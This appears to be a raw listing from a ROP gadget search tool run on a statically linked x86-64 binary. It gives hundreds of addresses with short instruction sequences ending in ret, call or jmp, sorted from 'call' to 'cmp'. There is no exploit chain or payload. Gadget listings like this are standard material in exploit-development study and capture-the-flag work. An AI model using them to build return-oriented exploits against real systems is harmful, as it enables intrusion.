0x0000000000468f2b : call qword ptr [rdx + rax*8]
0x00000000004948bf : call qword ptr [rdx]
0x000000000047fda6 : call qword ptr [rip + 0x23cab4]
0x000000000047fd5d : call qword ptr [rip + 0x23cafd]
0x00000000004943eb : call qword ptr [rsi + 0x26fff99a]
0x0000000000494843 : call qword ptr [rsi + 0x26fffa19]
0x0000000000489ba1 : call qword ptr [rsi]
0x000000000047c7f7 : call r10
0x000000000040092c : call r11
0x000000000044b030 : call r12
0x000000000044f3d0 : call r14
0x000000000044b572 : call r15
0x0000000000494217 : call rax
0x000000000040092d : call rbx
0x000000000041d2b3 : call rcx
0x000000000044b573 : call rdi
0x000000000040e9c7 : call rdx
0x000000000044f3d1 : call rsi
0x000000000044b031 : call rsp
0x0000000000429767 : cdq ; adc al, byte ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000048c6d4 : cdq ; add rax, r9 ; jmp rax
0x00000000004952dd : cdq ; cli ; inc dword ptr [rax - 0x65] ; cli ; jmp rax
0x00000000004a8fe0 : cdq ; in eax, 0xff ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x0000000000461503 : cdq ; ret 0xffff
0x000000000040716b : cdq ; sbb eax, dword ptr [rax] ; add byte ptr [rbx - 0x7bf0fe07], al ; retf 0x1b
0x00000000004943a1 : cdq ; stc ; call qword ptr [rcx + 0x21fff999]
0x0000000000494465 : cdq ; stc ; call rax
0x00000000004943a5 : cdq ; stc ; jmp qword ptr [rcx]
0x000000000047d889 : clc ; add al, 0x75 ; retf
0x0000000000478074 : clc ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000469e21 : clc ; add cl, byte ptr [rax + 0x29] ; ret 0xb8
0x000000000041d90a : clc ; add cl, byte ptr [rax + 0xf] ; ret 0x8948
0x000000000041d567 : clc ; add cl, byte ptr [rax + 0xf] ; ret 0x8d44
0x000000000047e7c3 : clc ; add cl, byte ptr [rax - 0x77] ; ret 0xc148
0x000000000040d5ad : clc ; add dword ptr [rbx - 0x7cb70030], eax ; ret
0x000000000048877f : clc ; add ebx, dword ptr [rbp + 0x41] ; pop rsp ; pop r13 ; ret
0x0000000000450622 : clc ; add ecx, dword ptr [rax - 0x77] ; or byte ptr [r15], 0x8e ; ret 1
0x000000000042ba87 : clc ; add rax, rcx ; ret
0x000000000042bfb4 : clc ; add rax, rcx ; vzeroupper ; ret
0x00000000004af83a : clc ; call qword ptr [rax]
0x0000000000495379 : clc ; cli ; call qword ptr [rax]
0x0000000000495399 : clc ; cli ; call rax
0x000000000049537d : clc ; cli ; jmp qword ptr [rax]
0x000000000049539d : clc ; cli ; push rax ; clc ; cli ; call qword ptr [rax]
0x00000000004b2df8 : clc ; cli ; sti ; jmp qword ptr [rbx]
0x00000000004236a8 : clc ; cmovne rax, rcx ; ret
0x000000000042e0f9 : clc ; cmp rcx, rax ; jne 0x42e12b ; xor eax, eax ; ret
0x000000000042e0f8 : clc ; cmp rcx, rax ; jne 0x42e12c ; xor eax, eax ; ret
0x00000000004abf08 : clc ; cwde ; cmc ; call rax
0x0000000000476a56 : clc ; dec dword ptr [rax + 0x39] ; ret
0x000000000047fa40 : clc ; dec dword ptr [rax + 0xf] ; ret 0x66c3
0x0000000000424070 : clc ; dec dword ptr [rax + 0xf] ; ret 0x8348
0x0000000000472970 : clc ; dec dword ptr [rax + 1] ; ret
0x000000000047fc64 : clc ; dec dword ptr [rax - 0x73] ; push rbp ; add dword ptr [rax + 0x39], ecx ; ret 0x1272
0x000000000048cbbe : clc ; dec dword ptr [rax - 0x75] ; push rbp ; add byte ptr [rax + 0x63], cl ; ret 0xbc80
0x0000000000401b6c : clc ; dec dword ptr [rax - 0x77] ; ret
0x000000000046fe89 : clc ; dec dword ptr [rax - 0x77] ; ret 0xf41
0x0000000000411b5d : clc ; dec dword ptr [rax - 0x77] ; retf
0x0000000000478b9b : clc ; dec dword ptr [rax - 0x7d] ; ret
0x0000000000492285 : clc ; dec dword ptr [rcx - 0x73] ; and byte ptr [rax - 0x7d], cl ; retf
0x0000000000461ad6 : clc ; dec dword ptr [rcx - 0x77] ; ret
0x000000000045fa7e : clc ; dec dword ptr [rdi] ; test dword ptr [rsi - 0x16000007], esi ; ret
0x000000000045ee33 : clc ; idiv bh ; inc dword ptr [rax] ; add byte ptr [rax], al ; add cl, ch ; ret 0xfffa
0x000000000045a092 : clc ; inc dword ptr [rcx - 0x77] ; ret 0x840f
0x0000000000448aba : clc ; jg 0x448a89 ; mov eax, 0x80 ; pop rbx ; ret
0x0000000000448b16 : clc ; jg 0x448b16 ; int1 ; mov eax, eax ; ret
0x0000000000454937 : clc ; jg 0x4548c6 ; ret 0xdb76
0x0000000000454937 : clc ; jg 0x4548ca ; ret 0xdb76
0x0000000000492265 : clc ; jmp 0x49211c
0x00000000004af84e : clc ; jmp qword ptr [rsi]
0x00000000004609df : clc ; jmp rax
0x000000000048d663 : clc ; leave ; ret
0x00000000004a7c42 : clc ; mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x0000000000413234 : clc ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000042fbf7 : clc ; mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000430567 : clc ; mov qword ptr [rdi - 0xd], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00000000004354b7 : clc ; mov qword ptr [rdi - 0xd], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000430767 : clc ; mov qword ptr [rdi - 0xe], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000435427 : clc ; mov qword ptr [rdi - 0xe], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000430967 : clc ; mov qword ptr [rdi - 0xf], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000435397 : clc ; mov qword ptr [rdi - 0xf], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000042fc13 : clc ; mov qword ptr [rdi - 8], rdx ; ret
0x00000000004485fe : clc ; mov qword ptr [rdi], rcx ; ret
0x000000000044877d : clc ; mov qword ptr [rdi], rcx ; vzeroupper ; ret
0x0000000000438e4c : clc ; mov qword ptr [rdi], rsi ; mov qword ptr [r9 - 8], rcx ; ret
0x000000000044788a : clc ; mov qword ptr [rdi], rsi ; ret
0x000000000048d7e1 : clc ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x000000000046f4e0 : clc ; mov rdx, r8 ; jmp 0x46f4b2
0x000000000041324c : clc ; or ebp, edx ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000496278 : clc ; outsd dx, dword ptr [rsi] ; sti ; call rax
0x000000000041b476 : clc ; pop rbp ; pop r12 ; ret
0x0000000000471a27 : clc ; push qword ptr [rbp + rax + 0x5b] ; pop rbp ; pop r12 ; ret
0x00000000004755d3 : clc ; push qword ptr [rdi + rax*2 - 0x77] ; ret 0xe283
0x00000000004b0f54 : clc ; push rbp ; add byte ptr [rax], al ; call 0x114b0968
0x0000000000491078 : clc ; push rbx ; ret
0x0000000000413265 : clc ; ret
0x000000000046388c : clc ; retf
0x000000000043f5d4 : clc ; rol ch, 1 ; jns 0x43f5b5 ; retf 0xead3
0x000000000043f724 : clc ; rol ch, 1 ; jns 0x43f705 ; retf 0xead3
0x000000000043f874 : clc ; rol ch, 1 ; jns 0x43f855 ; retf 0xead3
0x000000000043f9c4 : clc ; rol ch, 1 ; jns 0x43f9a5 ; retf 0xead3
0x000000000043fb14 : clc ; rol ch, 1 ; jns 0x43faf5 ; retf 0xead3
0x000000000043fc64 : clc ; rol ch, 1 ; jns 0x43fc45 ; retf 0xead3
0x000000000043fdb4 : clc ; rol ch, 1 ; jns 0x43fd95 ; retf 0xead3
0x000000000043ff04 : clc ; rol ch, 1 ; jns 0x43fee5 ; retf 0xead3
0x0000000000440054 : clc ; rol ch, 1 ; jns 0x440035 ; retf 0xead3
0x00000000004401a4 : clc ; rol ch, 1 ; jns 0x440185 ; retf 0xead3
0x00000000004402f4 : clc ; rol ch, 1 ; jns 0x4402d5 ; retf 0xead3
0x0000000000440444 : clc ; rol ch, 1 ; jns 0x440425 ; retf 0xead3
0x0000000000440594 : clc ; rol ch, 1 ; jns 0x440575 ; retf 0xead3
0x00000000004406e4 : clc ; rol ch, 1 ; jns 0x4406c5 ; retf 0xead3
0x0000000000440834 : clc ; rol ch, 1 ; jns 0x440815 ; retf 0xead3
0x0000000000482f3a : clc ; shl r9, cl ; mov qword ptr [rdi - 0x10], r9 ; ret
0x000000000047466f : clc ; shr rax, 2 ; ret
0x0000000000494ca5 : clc ; stc ; jmp qword ptr [rax]
0x0000000000481bad : clc ; std ; jbe 0x481bbd ; ret
0x00000000004b0e21 : clc ; std ; jmp qword ptr [rdx]
0x000000000041a00f : clc ; sub dword ptr [rax], eax ; ret
0x0000000000466ea4 : clc ; sub eax, 0xf410004 ; xchg eax, esp ; ret
0x00000000004853b1 : clc ; sub rax, r8 ; ret
0x00000000004414f6 : clc ; sub rax, rdx ; vzeroupper ; ret
0x000000000044749b : clc ; sub rax, rsi ; ret
0x000000000042c12b : clc ; vzeroupper ; ret
0x000000000047fd59 : clc ; xor dword ptr [rsi + 0x63], esi ; call qword ptr [rip + 0x23cafd]
0x00000000004b0458 : cld ; add byte ptr [rax], al ; je 0x4b0411 ; stc ; call rsi
0x0000000000448a1f : cld ; add eax, dword ptr [rax] ; pop rbx ; ret
0x0000000000412b0e : cld ; add rdx, rcx ; jmp 0x412b24
0x00000000004b4216 : cld ; call rdx
0x00000000004953c1 : cld ; cli ; call rax
0x00000000004953cd : cld ; cli ; inc dword ptr [rax] ; std ; cli ; call qword ptr [rax]
0x00000000004953c5 : cld ; cli ; jmp rax
0x0000000000449b42 : cld ; dec dword ptr [rax - 0x77] ; ret 0x8b48
0x000000000047bd7e : cld ; inc dword ptr [rbp + 0x5b0e78c0] ; ret
0x0000000000448afc : cld ; inc dword ptr [rbx] ; div ecx ; pop rbx ; mov eax, eax ; ret
0x0000000000448a6a : cld ; inc dword ptr [rbx] ; pop rbx ; ret
0x00000000004b2ff2 : cld ; jmp qword ptr [rax]
0x00000000004b300a : cld ; jmp qword ptr [rbx]
0x00000000004b340a : cld ; jmp qword ptr [rcx]
0x00000000004b42e2 : cld ; jmp qword ptr [rsi]
0x00000000004b2faa : cld ; jmp rdx
0x00000000004a89c5 : cld ; lodsb al, byte ptr [rsi] ; loop 0x4a8994 ; retf
0x0000000000430382 : cld ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000430585 : cld ; mov dword ptr [rdi - 5], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000430785 : cld ; mov dword ptr [rdi - 6], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000430985 : cld ; mov dword ptr [rdi - 7], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000448606 : cld ; mov dword ptr [rdi], ecx ; ret
0x0000000000448788 : cld ; mov dword ptr [rdi], ecx ; vzeroupper ; ret
0x0000000000438e5e : cld ; mov dword ptr [rdi], esi ; mov dword ptr [r9 - 4], ecx ; ret
0x0000000000447898 : cld ; mov dword ptr [rdi], esi ; ret
0x0000000000447892 : cld ; mov esi, dword ptr [rsi] ; mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], esi ; ret
0x000000000042ffb6 : cld ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000435646 : cld ; mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000430196 : cld ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004355c6 : cld ; mov qword ptr [rdi - 0xb], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000430376 : cld ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000435546 : cld ; mov qword ptr [rdi - 0xc], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000042fdd6 : cld ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004356c6 : cld ; mov qword ptr [rdi - 9], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000044a637 : cld ; mov rdi, r12 ; mov eax, 0x4f ; syscall
0x000000000042fc61 : cld ; ret
0x0000000000409630 : cld ; retf 0xffff
0x00000000004a70e3 : cld ; shr al, cl ; add al, 0x3d ; retf
0x0000000000494ced : cld ; stc ; jmp qword ptr [rax + 0x20fff9fd]
0x00000000004ab3cd : cld ; std ; call rax
0x0000000000419b0a : cld ; sub dword ptr [rax], eax ; ret
0x00000000004a70f6 : cld ; test al, 0x97 ; xchg eax, esp ; ret
0x0000000000448122 : cld ; vzeroupper ; ret
0x0000000000415f01 : cli ; add ch, al ; pop rax ; ret
0x0000000000416008 : cli ; add ch, al ; push rcx ; ret 0xffff
0x0000000000469375 : cli ; add cl, byte ptr [rax + 0x39] ; ret 0x850f
0x0000000000411ec2 : cli ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x2948
0x00000000004485f1 : cli ; add dword ptr [rdi + 0x15], esi ; jb 0x448601 ; mov byte ptr [rdi], cl ; ret
0x00000000004475eb : cli ; add dword ptr [rdx + 2], esi ; mov byte ptr [rdi], cl ; ret
0x0000000000438e7c : cli ; add dword ptr [rdx + 4], esi ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00000000004496de : cli ; add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xc085
0x000000000044973c : cli ; add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xd284
0x00000000004a90d9 : cli ; call 0xffffffffab585bd1
0x0000000000494c66 : cli ; call qword ptr [rax + 0x10fffa0b]
0x0000000000494c5e : cli ; call qword ptr [rax + 0x10fffa0c]
0x0000000000494c56 : cli ; call qword ptr [rax + 0x10fffa0d]
0x0000000000494c4e : cli ; call qword ptr [rax + 0x10fffa0e]
0x0000000000494a42 : cli ; call qword ptr [rax + 0x10fffa10]
0x0000000000494a12 : cli ; call qword ptr [rax + 0x20fffa17]
0x0000000000494d32 : cli ; call qword ptr [rax + 0x20fffa3a]
0x0000000000494f0a : cli ; call qword ptr [rax + 0x20fffa3e]
0x000000000049533a : cli ; call qword ptr [rax + 0x20fffaa1]
0x000000000049483a : cli ; call qword ptr [rax + 0x26fffa13]
0x000000000049530a : cli ; call qword ptr [rax - 0x1f00055a]
0x000000000049481a : cli ; call qword ptr [rax]
0x00000000004b1d22 : cli ; call qword ptr [rbx]
0x00000000004b1a22 : cli ; call qword ptr [rcx]
0x00000000004b123a : cli ; call qword ptr [rdi]
0x00000000004948e6 : cli ; call qword ptr [rdx + 0x22fffa15]
0x0000000000494dde : cli ; call qword ptr [rdx + 0x22fffa3c]
0x00000000004948be : cli ; call qword ptr [rdx]
0x0000000000494842 : cli ; call qword ptr [rsi + 0x26fffa19]
0x0000000000494862 : cli ; call qword ptr [rsi]
0x000000000049480a : cli ; call rax
0x00000000004b11a6 : cli ; call rcx
0x00000000004948f6 : cli ; call rdx
0x0000000000494852 : cli ; call rsi
0x0000000000494eb6 : cli ; call rsp
0x00000000004af8b1 : cli ; clc ; call qword ptr [rax]
0x0000000000494155 : cli ; clc ; jmp rax
0x000000000044cbd5 : cli ; cmp eax, 0x83497174 ; ret
0x000000000045d58e : cli ; dec dword ptr [rax + 0x29] ; ret
0x000000000047f5e0 : cli ; dec dword ptr [rax - 0x77] ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x000000000045cd35 : cli ; dec dword ptr [rbp - 0x7b] ; dec dword ptr [rax - 0x77] ; ret
0x0000000000471c77 : cli ; dec dword ptr [rbx - 0x14f3db8c] ; ret 0x5590
0x0000000000494cfe : cli ; dec dword ptr [rsi + 0x39] ; cli ; call rax
0x00000000004928f5 : cli ; idiv bh ; retf 0xf6fa
0x0000000000494a1e : cli ; inc dword ptr [rax + 0x16] ; cli ; call rax
0x0000000000494806 : cli ; inc dword ptr [rax + 0x19] ; cli ; call rax
0x0000000000494f16 : cli ; inc dword ptr [rax + 0x3d] ; cli ; call rax
0x0000000000495316 : cli ; inc dword ptr [rax - 0x2f000556] ; stosd dword ptr [rdi], eax ; cli ; jmp qword ptr [rax]
0x0000000000495306 : cli ; inc dword ptr [rax - 0x5b] ; cli ; call qword ptr [rax - 0x1f00055a]
0x0000000000494c7e : cli ; inc dword ptr [rax - 0x5f000615] ; in al, dx ; stc ; jmp qword ptr [rax]
0x00000000004952de : cli ; inc dword ptr [rax - 0x65] ; cli ; jmp rax
0x00000000004952be : cli ; inc dword ptr [rax - 0x72] ; cli ; jmp rax
0x0000000000494836 : cli ; inc dword ptr [rax] ; adc al, 0xfa ; call qword ptr [rax + 0x26fffa13]
0x0000000000495376 : cli ; inc dword ptr [rax] ; clc ; cli ; call qword ptr [rax]
0x000000000049523e : cli ; inc dword ptr [rax] ; cli ; call qword ptr [rax]
0x0000000000494d2e : cli ; inc dword ptr [rax] ; cmp edi, edx ; call qword ptr [rax + 0x20fffa3a]
0x0000000000495336 : cli ; inc dword ptr [rax] ; mov ch, 0xfa ; call qword ptr [rax + 0x20fffaa1]
0x0000000000494c72 : cli ; inc dword ptr [rax] ; or bh, dl ; push qword ptr [rax + 9] ; cli ; jmp rax
0x0000000000494a6e : cli ; inc dword ptr [rax] ; or edi, edx ; push qword ptr [rax + 0xa] ; cli ; jmp rax
0x0000000000494a0e : cli ; inc dword ptr [rax] ; sbb dl, bh ; call qword ptr [rax + 0x20fffa17]
0x00000000004953ce : cli ; inc dword ptr [rax] ; std ; cli ; call qword ptr [rax]
0x0000000000494f76 : cli ; inc dword ptr [rax] ; xor dl, bh ; push qword ptr [rax + 0x2f] ; cli ; jmp rsi
0x000000000045a08f : cli ; inc dword ptr [rbx - 0x76be0008] ; ret 0x840f
0x0000000000452ded : cli ; inc dword ptr [rcx - 0x77] ; ret
0x00000000004560d5 : cli ; inc dword ptr [rcx - 0x77] ; ret 0x5be9
0x00000000004948f2 : cli ; inc dword ptr [rdx + 0x14] ; cli ; call rdx
0x0000000000494ffa : cli ; inc dword ptr [rdx + 0x2f] ; cli ; call rdx
0x0000000000494dea : cli ; inc dword ptr [rdx + 0x3b] ; cli ; call rdx
0x0000000000494eb2 : cli ; inc dword ptr [rdx + rdi - 6] ; call rsp
0x0000000000494dda : cli ; inc dword ptr [rdx] ; cmp eax, 0x3c92fffa ; cli ; jmp qword ptr [rdx]
0x000000000049484e : cli ; inc dword ptr [rsi + 0x18] ; cli ; call rsi
0x0000000000494d46 : cli ; inc dword ptr [rsi + 0x3f] ; cli ; call rsi
0x0000000000494826 : cli ; inc eax ; adc eax, 0x1550fffa ; cli ; jmp rax
0x00000000004953be : cli ; inc eax ; cld ; cli ; call rax
0x0000000000495366 : cli ; inc eax ; idiv edx ; call rax
0x0000000000495326 : cli ; inc eax ; scasd eax, dword ptr [rdi] ; cli ; call qword ptr [rax]
0x00000000004953ee : cli ; inc eax ; std ; cli ; jmp rax
0x0000000000494e92 : cli ; inc esp ; cmp eax, 0x3d54fffa ; cli ; jmp rsp
0x0000000000438e37 : cli ; jg 0x438e4a ; vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x00000000004475b6 : cli ; jg 0x4475c8 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x0000000000447be9 : cli ; jg 0x447bfc ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x0000000000448051 : cli ; jg 0x448064 ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x0000000000448772 : cli ; jg 0x448782 ; vzeroupper ; ret
0x0000000000448948 : cli ; jg 0x448958 ; vzeroupper ; ret
0x0000000000494c2e : cli ; jmp qword ptr [rax + 0x10fffa0a]
0x0000000000494c46 : cli ; jmp qword ptr [rax + 0x10fffa0f]
0x0000000000495136 : cli ; jmp qword ptr [rax + 0x10fffa2f]
0x0000000000494c26 : cli ; jmp qword ptr [rax + 0x20fffa0b]
0x0000000000494c1e : cli ; jmp qword ptr [rax + 0x20fffa0c]
0x0000000000494c16 : cli ; jmp qword ptr [rax + 0x20fffa0d]
0x0000000000494c0e : cli ; jmp qword ptr [rax + 0x20fffa0e]
0x0000000000494f6a : cli ; jmp qword ptr [rax + 0x20fffa31]
0x0000000000494f62 : cli ; jmp qword ptr [rax + 0x20fffa32]
0x0000000000494f5a : cli ; jmp qword ptr [rax + 0x20fffa33]
0x0000000000494f52 : cli ; jmp qword ptr [rax + 0x20fffa34]
0x0000000000494f4a : cli ; jmp qword ptr [rax + 0x20fffa35]
0x00000000004952ba : cli ; jmp qword ptr [rax + 0x40fffa8c]
0x0000000000494cba : cli ; jmp qword ptr [rax - 0x1f0005ff]
0x000000000049542e : cli ; jmp qword ptr [rax - 0x3f000501]
0x000000000049540e : cli ; jmp qword ptr [rax - 0x3f000502]
0x0000000000494a16 : cli ; jmp qword ptr [rax]
0x00000000004948ea : cli ; jmp qword ptr [rdx]
0x000000000049483e : cli ; jmp qword ptr [rsi]
0x00000000004952c2 : cli ; jmp rax
0x000000000040d354 : cli ; jmp rdx
0x0000000000494876 : cli ; jmp rsi
0x00000000004949a2 : cli ; jmp rsp
0x00000000004948ba : cli ; ljmp [rbx + rdx - 6] ; call qword ptr [rdx]
0x00000000004949f6 : cli ; ljmp [rdx + 0x3afffa13] ; adc edi, edx ; jmp rax
0x00000000004950fe : cli ; ljmp [rdx + 0x50fffa2e] ; cli ; call rax
0x000000000045574c : cli ; loopne 0x4557c9 ; jae 0x4556df ; retf 0xb941
0x0000000000430788 : cli ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004004ca : cli ; mov ebp, dword ptr [rbx] ; add byte ptr [rsi - 0x70], ah ; ret
0x000000000040d636 : cli ; movsxd rdi, dword ptr [r10 + rdi*4] ; add rdi, r10 ; jmp rdi
0x000000000042c438 : cli ; movzx edx, dl ; sub eax, edx ; ret
0x000000000042aee6 : cli ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004a9561 : cli ; push 0x6e ; ja 0x4a94ee ; ret 0x48f
0x0000000000494f7a : cli ; push qword ptr [rax + 0x2f] ; cli ; jmp rsi
0x0000000000494802 : cli ; push qword ptr [rax + 0x40fffa19] ; sbb edx, edi ; call rax
0x0000000000494a72 : cli ; push qword ptr [rax + 0xa] ; cli ; jmp rax
0x0000000000494c76 : cli ; push qword ptr [rax + 9] ; cli ; jmp rax
0x0000000000495362 : cli ; push qword ptr [rax - 0x3f000509] ; idiv edx ; call rax
0x0000000000495322 : cli ; push qword ptr [rax - 0x52] ; cli ; inc eax ; scasd eax, dword ptr [rdi] ; cli ; call qword ptr [rax]
0x0000000000494a3a : cli ; push qword ptr [rax] ; adc edi, edx ; call rax
0x0000000000494f46 : cli ; push qword ptr [rax] ; cli ; jmp qword ptr [rax + 0x20fffa35]
0x0000000000495312 : cli ; push qword ptr [rax] ; test eax, 0xaa80fffa ; cli ; call rax
0x0000000000495132 : cli ; push qword ptr [rax] ; xor dl, bh ; jmp qword ptr [rax + 0x10fffa2f]
0x00000000004948ee : cli ; push qword ptr [rdx + 0x42fffa14] ; adc al, 0xfa ; call rdx
0x0000000000494de6 : cli ; push qword ptr [rdx + 0x42fffa3b] ; cmp edi, edx ; call rdx
0x0000000000494eae : cli ; push qword ptr [rdx + rdi + 0x3a44fffa] ; cli ; call rsp
0x000000000049484a : cli ; push qword ptr [rsi + 0x46fffa18] ; sbb dl, bh ; call rsi
0x000000000049539e : cli ; push rax ; clc ; cli ; call qword ptr [rax]
0x00000000004953ca : cli ; push rax ; cld ; cli ; inc dword ptr [rax] ; std ; cli ; call qword ptr [rax]
0x000000000049523a : cli ; push rax ; cli ; inc dword ptr [rax] ; cli ; call qword ptr [rax]
0x0000000000495372 : cli ; push rax ; idiv edx ; inc dword ptr [rax] ; clc ; cli ; call qword ptr [rax]
0x0000000000494d52 : cli ; push rsi ; cmp eax, 0x3d86fffa ; cli ; call qword ptr [rsi]
0x0000000000448529 : cli ; rep stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x00000000004a8005 : cli ; ret 0xac65
0x000000000044c68b : cli ; setae al ; ret
0x0000000000494ca9 : cli ; stc ; jmp qword ptr [rax + 0x20fff9fb]
0x0000000000494ce9 : cli ; stc ; jmp qword ptr [rax]
0x00000000004b2df9 : cli ; sti ; jmp qword ptr [rbx]
0x00000000004a7eb0 : cli ; test bh, dl ; retf 0xdf7f
0x0000000000441329 : cli ; test rdx, rdx ; je 0x441349 ; bsf rax, rdx ; ret
0x00000000004738f8 : cli ; test rdx, rdx ; je 0x473929 ; bsf rax, rdx ; ret
0x00000000004a6c4a : cli ; xchg dword ptr [rsp + rax + 0x6fa9ce9d], esp ; ret
0x00000000004ab992 : cmc ; call qword ptr [rbx]
0x00000000004abe6a : cmc ; call qword ptr [rdx]
0x00000000004abf0a : cmc ; call rax
0x00000000004abe7e : cmc ; call rsp
0x00000000004ac022 : cmc ; jmp qword ptr [rax]
0x00000000004a9989 : cmc ; mov ch, 0xab ; ret
0x00000000004355ca : cmc ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000043000e : cmc ; mov dword ptr [rdi - 4], edx ; ret
0x000000000046ff47 : cmc ; mov rbp, rax ; jmp 0x46ff14
0x0000000000446973 : cmc ; movzx edx, byte ptr [rsi - 0xb] ; sub eax, edx ; ret
0x00000000004a6837 : cmc ; pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x0000000000494c9d : cmc ; stc ; jmp qword ptr [rax]
0x0000000000469ab1 : cmc ; std ; dec dword ptr [rax - 0x7d] ; clc ; dec dword ptr [rax - 0x77] ; ret
0x0000000000446977 : cmc ; sub eax, edx ; ret
0x00000000004a8fc5 : cmc ; xlatb ; ret 0x4e27
0x0000000000419929 : cmovae eax, dword ptr [rdi + 0x10] ; sub rax, qword ptr [rdi + 0x18] ; ret
0x0000000000419928 : cmovae rax, qword ptr [rdi + 0x10] ; sub rax, qword ptr [rdi + 0x18] ; ret
0x0000000000448a44 : cmove eax, ecx ; pop rbx ; ret
0x0000000000471fd1 : cmove eax, ecx ; ret
0x0000000000424073 : cmove eax, edx ; add rsp, 8 ; ret
0x0000000000448a0c : cmove eax, edx ; pop rbx ; ret
0x00000000004241af : cmove eax, edx ; ret
0x000000000041537f : cmove ebp, esp ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000047e8c8 : cmove ecx, eax ; mov rax, rcx ; ret
0x0000000000471fd0 : cmove r8, rcx ; ret
0x0000000000448a43 : cmove rax, rcx ; pop rbx ; ret
0x0000000000424072 : cmove rax, rdx ; add rsp, 8 ; ret
0x0000000000448a0b : cmove rax, rdx ; pop rbx ; ret
0x00000000004241ae : cmove rax, rdx ; ret
0x000000000047e8c7 : cmove rcx, rax ; mov rax, rcx ; ret
0x0000000000416d6b : cmovg eax, ecx ; test rdx, rdx ; jne 0x416d69 ; ret
0x0000000000470aeb : cmovg eax, ecx ; test rdx, rdx ; jne 0x470ae9 ; ret
0x00000000004236aa : cmovne eax, ecx ; ret
0x0000000000448a9c : cmovne eax, edx ; pop rbx ; ret
0x00000000004240af : cmovne eax, edx ; ret
0x0000000000440eb4 : cmovne eax, edx ; vzeroupper ; ret
0x00000000004236a9 : cmovne rax, rcx ; ret
0x0000000000448a9b : cmovne rax, rdx ; pop rbx ; ret
0x00000000004240ae : cmovne rax, rdx ; ret
0x0000000000440eb3 : cmovne rax, rdx ; vzeroupper ; ret
0x000000000042ba48 : cmovs eax, dword ptr [rbx + 0x148f0e7] ; retf 0x8348
0x000000000045144c : cmovs eax, edx ; ret
0x000000000048dcd8 : cmovs ecx, dword ptr [rcx + 0x1bffe] ; add byte ptr [rax], al ; jmp rax
0x0000000000471d38 : cmovs edi, dword ptr [rcx] ; int1 ; jne 0x471d39 ; lea eax, [rdx + rdi] ; ret
0x00000000004489ee : cmovs esp, dword ptr [rbx + 0xc] ; xchg byte ptr [rax + 1], cl ; int1 ; jmp rcx
0x0000000000448a80 : cmovs esp, dword ptr [rbx + 4] ; xchg eax, esi ; add rax, rsi ; jmp rax
0x00000000004ab3cc : cmp ah, bh ; std ; call rax
0x0000000000447488 : cmp ah, byte ptr [rbx - 0x27] ; add cl, byte ptr [rdi] ; xchg eax, edx ; ror byte ptr [rdi], 0x94 ; ret 0xc085
0x0000000000488510 : cmp al, 0x23 ; add byte ptr [rax], al ; mov qword ptr [rbx + 0x18], rax ; pop rbx ; ret
0x0000000000456272 : cmp al, 0x24 ; add byte ptr [rcx - 0x77], al ; ret
0x0000000000450162 : cmp al, 0x24 ; add byte ptr [rdi], cl ; xchg eax, esp ; ret 0xd5e9
0x0000000000416f37 : cmp al, 0x24 ; add rsp, 0x10 ; pop rbx ; jmp rax
0x0000000000416f26 : cmp al, 0x24 ; call 0x4131b4
0x000000000048de2d : cmp al, 0x24 ; mov rdx, qword ptr [rbp] ; call r12
0x000000000048d2fc : cmp al, 0x31 ; or byte ptr [rbp + 4], dh ; mov qword ptr [rax], rdx ; ret
0x000000000048d28d : cmp al, 0x32 ; or byte ptr [rbp + 0x1a], dh ; mov rax, qword ptr [rax] ; ret
0x00000000004a7c40 : cmp al, 0x46 ; clc ; mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x00000000004a6b43 : cmp al, 0x66 ; movsb byte ptr [rdi], byte ptr [rsi] ; sub eax, 0xea4ca798 ; retf
